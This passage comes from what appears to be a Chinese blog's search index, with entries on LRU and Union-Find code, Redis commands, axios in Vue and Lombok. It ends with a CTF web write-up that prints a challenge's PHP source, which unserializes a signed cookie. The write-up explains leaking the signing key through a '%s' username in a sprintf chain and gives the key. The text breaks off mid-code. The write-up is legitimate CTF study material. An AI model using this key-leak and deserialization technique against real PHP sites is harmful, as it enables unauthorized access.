head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>pre <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">moveToTail</span><span class="token punctuation">(</span>node node<span class="token punctuation">)</span><span class="token punctuation">{</span>        node<span class="token punctuation">.</span>pre <span class="token operator">=</span> tail<span class="token punctuation">.</span>pre<span class="token punctuation">;</span>        tail<span class="token punctuation">.</span>pre <span class="token operator">=</span> node<span class="token punctuation">;</span>        node<span class="token punctuation">.</span>pre<span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>        node<span class="token punctuation">.</span>next <span class="token operator">=</span> tail<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Union-Find-算法"><a href="#Union-Find-算法" class="headerlink" title="Union-Find 算法"></a>Union-Find 算法</h2><p>Union-Find 算法，也就是常说的并查集算法，主要是解决图论中「动态连通性」问题</p><p>主要实现以下api</p><pre><code>class UF {    /* 将 p 和 q 连接 */    public void union(int p, int q);    /* 判断 p 和 q 是否连通 */    public boolean connected(int p, int q);    /* 返回图中有多少个连通分量 */    public int count();}</code></pre><blockquote><p>用数组来具体实现这个森林。设定树的每个节点有一个指针指向其父节点，如果是根节点的话，这个指针指向自己</p></blockquote><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">UF</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 连通分量个数</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 存储一棵树</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> parent<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 记录树的“重量”</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> size<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">UF</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> n<span class="token punctuation">;</span>        parent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            parent<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>            size<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> rootP <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> rootQ <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>rootP <span class="token operator">==</span> rootQ<span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 小树接到大树下面，较平衡</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size<span class="token punctuation">[</span>rootP<span class="token punctuation">]</span> <span class="token operator">></span> size<span class="token punctuation">[</span>rootQ<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            parent<span class="token punctuation">[</span>rootQ<span class="token punctuation">]</span> <span class="token operator">=</span> rootP<span class="token punctuation">;</span>            size<span class="token punctuation">[</span>rootP<span class="token punctuation">]</span> <span class="token operator">+=</span> size<span class="token punctuation">[</span>rootQ<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            parent<span class="token punctuation">[</span>rootP<span class="token punctuation">]</span> <span class="token operator">=</span> rootQ<span class="token punctuation">;</span>            size<span class="token punctuation">[</span>rootQ<span class="token punctuation">]</span> <span class="token operator">+=</span> size<span class="token punctuation">[</span>rootP<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        count<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">connected</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> rootP <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> rootQ <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> rootP <span class="token operator">==</span> rootQ<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">!=</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 进行路径压缩</span>            parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> parent<span class="token punctuation">[</span>parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            x <span class="token operator">=</span> parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> count<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis基础命令</title>
      <link href="/2020/07/20/redis%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/07/20/redis%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><blockquote><p>初学redis，对于redis的基础命令进行一下记录</p></blockquote><p>个人是在阿里云服务器上用docker配置环境，docker相对比较方便.. 配置好后一行命令进入redis</p><blockquote><p>docker exec -it myredis redis-cli</p></blockquote><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>redis支持五种数据类型：string(字符串),list(列表),hash(哈希),set(集合),sorted set(有序集合)</p><p>key-value格式</p><blockquote><p>keys [pattern]根据正则表达式获取键名 keys * 获取所有key</p><p>type 键名 获取键值类型</p><p>del 键名 删除键值</p></blockquote><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>string 类型是二进制安全的。意思是 redis 的 string 可以包含任何数据。比如jpg图片或者序列化的对象。</p><pre><code>127.0.0.1:6379&gt; set 4 5OK127.0.0.1:6379&gt; get 4&quot;5&quot;127.0.0.1:6379&gt; keys *1)&quot;4&quot;</code></pre><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>适合存储对象</p><p>hget获取对象某个属性值，hgetall获取对象所有信息</p><pre><code>127.0.0.1:6379&gt; hmset hash name kevin age 11OK127.0.0.1:6379&gt; hget hash name&quot;kevin&quot;127.0.0.1:6379&gt; hgetall hash1) &quot;name&quot;2) &quot;kevin&quot;3) &quot;age&quot;4) &quot;11&quot;</code></pre><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>按照插入顺序排序。你可以添加一个元素到列表的左边或者右边</p><pre><code>redis 127.0.0.1:6379&gt; LPUSH demolist redis(integer) 1redis 127.0.0.1:6379&gt; LPUSH demolist mongodb(integer) 2redis 127.0.0.1:6379&gt; LPUSH demolist mysql(integer) 3127.0.0.1:6379&gt; lrange demolist 0 101) &quot;mysql&quot;2) &quot;mongodb&quot;3) &quot;redis&quot;</code></pre><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。</p><pre><code>redis 127.0.0.1:6379&gt; SADD set redis(integer) 1redis 127.0.0.1:6379&gt; SADD set mongodb(integer) 1redis 127.0.0.1:6379&gt; SADD set mysql(integer) 1redis 127.0.0.1:6379&gt; SADD set mysql(integer) 0redis 127.0.0.1:6379&gt; SMEMBERS set1) &quot;mysql&quot;2) &quot;mongodb&quot;3) &quot;redis&quot;</code></pre><h3 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted set"></a>sorted set</h3><p>redis有序集合和集合一样也是string类型元素的集合,且不允许重复的成员。</p><p>不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。</p><pre><code>redis 127.0.0.1:6379&gt; ZADD runoobkey 1 redis(integer) 1redis 127.0.0.1:6379&gt; ZADD runoobkey 2 mongodb(integer) 1redis 127.0.0.1:6379&gt; ZRANGE runoobkey 0 10 WITHSCORES1) &quot;redis&quot;2) &quot;1&quot;3) &quot;mongodb&quot;4) &quot;2&quot;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> nosql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>axios实现vue访问后端接口数据</title>
      <link href="/2020/04/20/axios%E5%AE%9E%E7%8E%B0%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%B0%E6%8E%A5%E5%8F%A3/"/>
      <url>/2020/04/20/axios%E5%AE%9E%E7%8E%B0%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%B0%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>在实现交互式网站过程中，前端需要去获取后台的数据，在前端vue框架中一般建议使用axios来获取数据。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在项目里使用前需要先下载，只需要用npm一行命令</p><pre><code>npm install axios</code></pre><p>除此之外为了后期方便处理数据，还建议用qs库，一样需要下载</p><h2 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h2><p>在main.js中全局导入,并且配置默认设置</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span><span class="token keyword">import</span> qs <span class="token keyword">from</span> <span class="token string">'qs'</span>Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$axios <span class="token operator">=</span> axios<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//默认访问接口</span>axios<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>baseURL <span class="token operator">=</span> <span class="token string">'http://localhost:8080/'</span><span class="token punctuation">;</span>  axios<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>timeout <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//发送post请求的Content-Type头部默认内容</span>axios<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>post<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'application/x-www-form-urlencoded;charset=UTF-8'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 添加请求拦截器</span>axios<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>config<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 参数格式转换，处理post请求获取的数据</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>method<span class="token operator">===</span><span class="token string">"post"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    config<span class="token punctuation">.</span>data <span class="token operator">=</span> qs<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> config<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 对请求错误做些什么</span>  <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>接下来在某一vue文件中,只需要this.$axios便可以发送请求</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"user/register"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>        name<span class="token punctuation">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>        password<span class="token punctuation">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">,</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">alert</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">)</span>      <span class="token punctuation">}</span>        <span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">.</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>path<span class="token punctuation">:</span> <span class="token string">'/signin'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lombok插件</title>
      <link href="/2020/04/19/springboot%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/"/>
      <url>/2020/04/19/springboot%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>在最近的实践课作业用到了springboot框架，开发工具是idea</p><p>其中用到了lombok插件，感觉对于提高开发效率有很好的帮助</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>idea环境的话，直接在插件商场下载</p><p><img src="https://s1.ax1x.com/2020/04/19/JMSbEd.png" alt></p><blockquote><p>之后在pom.xml里添加依赖</p></blockquote><pre><code>&lt;dependency&gt;    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;    &lt;artifactId&gt;lombok&lt;/artifactId&gt;    &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt;</code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>lombok插件的使用是注解形式</p><p><img src="https://s1.ax1x.com/2020/04/19/JM9Tkd.png" alt></p><blockquote><p>在实体类中使用@Data注解后，相当于设置了getter，setter，重写了tostring方法，大大提高开发效率</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame-week3</title>
      <link href="/2020/04/15/hgame-week3/"/>
      <url>/2020/04/15/hgame-week3/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="序列之争"><a href="#序列之争" class="headerlink" title="序列之争"></a>序列之争</h3><a id="more"></a><blockquote><p>在检查源代码时发现前端注释中写着source.zip，于是下载压缩包，开始php代码审计。</p><p>从题目序列之争得到暗示，借助搜索引擎发现是考察反序列，关注序列函数发现在moster类中，发现可以在cookie传入monster，猜测是从这里入手；往后看发现把monsterdata与encryptKey连接进行MD5加密，用于获取cookie后的检验，于是再去找encryptKey</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Monster</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$monsterData</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$encryptKey</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encryptKey</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'monster'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$monsterData</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'monster'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$monsterData</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$monsterData</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$monsterData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$monsterData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$monsterData</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$monsterData</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encryptKey</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$sign</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">monsterData</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$monsterData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'monster'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                exit<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$monsterName</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'无名小怪'</span><span class="token punctuation">,</span> <span class="token string">'BOSS: The Kernal Cosmos'</span><span class="token punctuation">,</span> <span class="token string">'小怪: Big Eggplant'</span><span class="token punctuation">,</span> <span class="token string">'BOSS: The Mole King'</span><span class="token punctuation">,</span> <span class="token string">'BOSS: Zero Zone Witch'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">monsterData</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string">'name'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$monsterName</span><span class="token punctuation">[</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$monsterName</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'no'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">monsterData</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">monsterData</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encryptKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'monster'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">monsterData</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$sign</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>在Game类中发现是将用户名和$encryptKey进行连接加密后传入monster中作为密钥；我一开始以为这里写着的$encryptKey就真的是$encryptKey…后来看了出题人的博客发现，把%s作为用户名传入才能得出真正的$encryptKey即gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">{</span>       <span class="token keyword">private</span> <span class="token variable">$encryptKey</span> <span class="token operator">=</span> <span class="token string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$welcomeMsg</span> <span class="token operator">=</span> <span class="token string">'%s, Welcome to Ordinal Scale!'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$playerName</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'player'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$playerName</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$playerName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encryptKey</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">monster</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Monster</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sign</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rank</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">welcomeMsg</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">welcomeMsg</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sign</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sign</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token 